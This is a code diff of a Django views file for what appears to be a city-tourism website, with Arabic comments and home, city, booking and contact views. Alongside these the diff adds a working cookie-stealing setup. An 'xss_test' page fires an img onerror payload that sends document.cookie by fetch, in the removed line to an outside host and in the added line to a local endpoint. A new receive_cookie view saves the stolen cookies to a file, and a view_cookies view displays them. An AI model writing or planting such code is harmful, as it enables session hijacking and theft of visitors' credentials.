@@ -1,24 +1,25 @@
 from django.shortcuts import render, get_object_or_404
 from .models import City
+from django.http import HttpResponse
+import os
 
-# عرض أول 6 مدن فقط
+# الصفحة الرئيسية
 def home(request):
-    cities = City.objects.all()[:6]  # جلب أول 6 مدن
+    cities = City.objects.all()[:6]
     return render(request, 'home.html', {'cities': cities})
 
-# عرض تفاصيل المدينة مع المعارض
+# تفاصيل مدينة
 def city_detail(request, city_id):
     city = get_object_or_404(City, pk=city_id)
-    images = city.gallery.all()  # افترض أن لديك علاقة مع نموذج الصور هنا
+    images = city.gallery.all()
     return render(request, 'city_detail.html', {'city': city, 'images': images})
 
 # صفحة الحجز
 def booking(request):
     return render(request, 'booking.html')
 
-# صفحة الاتصال
+# صفحة التواصل
 from django.core.mail import send_mail
-from django.shortcuts import render, redirect
 from .models import ContactMessage
 
 def contact(request):
@@ -27,15 +28,13 @@ def contact(request):
         email = request.POST.get('email')
         message = request.POST.get('message')
 
-        # حفظ في قاعدة البيانات
         ContactMessage.objects.create(name=name, email=email, message=message)
 
-        # إرسال إيميل
         send_mail(
             subject=f'New Contact Message from {name}',
             message=message,
             from_email=email,
-            recipient_list=['oboulechfar1@gmail.com'],  # غيرها لإيميلك
+            recipient_list=['oboulechfar1@gmail.com'],
             fail_silently=False,
         )
 
@@ -43,19 +42,30 @@ def contact(request):
 
     return render(request, 'contact.html')
 
-from django.http import HttpResponse
-
+# صفحة XSS
 def xss_test(request):
     return HttpResponse("""
         <html>
         <body>
         <h1>XSS Test</h1>
-        <img src="x" onerror="fetch('https://usaau.com/collect/?cookie='+document.cookie)">
+        <img src="x" onerror="fetch('/collect/?cookie='+document.cookie)">
         </body>
         </html>
     """)
-def view_cookies(request):
-    with open("cookies.txt", "r") as f:
-        content = f.read()
-    return HttpResponse(f"<pre>{content}</pre>")
 
+# استقبال الكوكيز وتخزينها
+def receive_cookie(request):
+    cookie = request.GET.get("cookie", "")
+    if cookie:
+        with open("cookies.txt", "a") as f:
+            f.write(cookie + "\n")
+    return HttpResponse("Cookie received")
+
+# عرض الكوكيز المخزنة
+def view_cookies(request):
+    if os.path.exists("cookies.txt"):
+        with open("cookies.txt", "r") as f:
+            content = f.read()
+    else:
+        content = "No cookies stored yet."
+    return HttpResponse(f"<pre>{content}</pre>")
